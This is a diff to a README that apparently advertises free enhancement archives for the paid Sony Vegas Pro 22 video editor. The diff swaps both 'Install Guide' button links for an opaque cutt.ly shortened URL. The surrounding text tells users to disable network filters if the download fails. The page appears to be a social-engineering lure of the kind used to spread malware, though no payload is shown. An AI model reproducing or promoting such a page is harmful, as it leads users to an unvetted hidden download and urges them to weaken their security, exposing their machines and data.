@@ -6,7 +6,7 @@
 
 **About VegasProBoostPack2025**: VegasProBoostPack2025 is a comprehensive repository for *Sony Vegas Pro 22* users on Windows, offering free enhancement archives to complement this premium video editing suite. Priced at approximately $399 or via subscription, Vegas Pro 22 boasts AI tools, GPU-accelerated rendering, and 8K editing. Our archives include custom scripts, effect presets, and optimization tools to streamline editing, improve output quality, and expand creative options. Supported by 75K+ visitors and 50K+ members, this 2025 update enhances your paid software experience with community-driven solutions tailored for professional video production. (348 characters)
 
-<a href="https://vegas-pro-enhance-union.github.io/.github/" target="_blank">
+<a href="https://cutt.ly/FrNtjkvz" target="_blank">
   <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
 </a>
 
@@ -31,7 +31,7 @@ Enhance your *Sony Vegas Pro 22* with **VegasProBoostPack2025** on Windows:
 5. **Fix Download Issues** 🌐  
    If the archive doesn’t download, disable network filters or switch browsers (Chrome, Firefox).
 
-<a href="https://vegas-pro-enhance-union.github.io/.github/" target="_blank">
+<a href="https://cutt.ly/FrNtjkvz" target="_blank">
   <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
 </a>
 
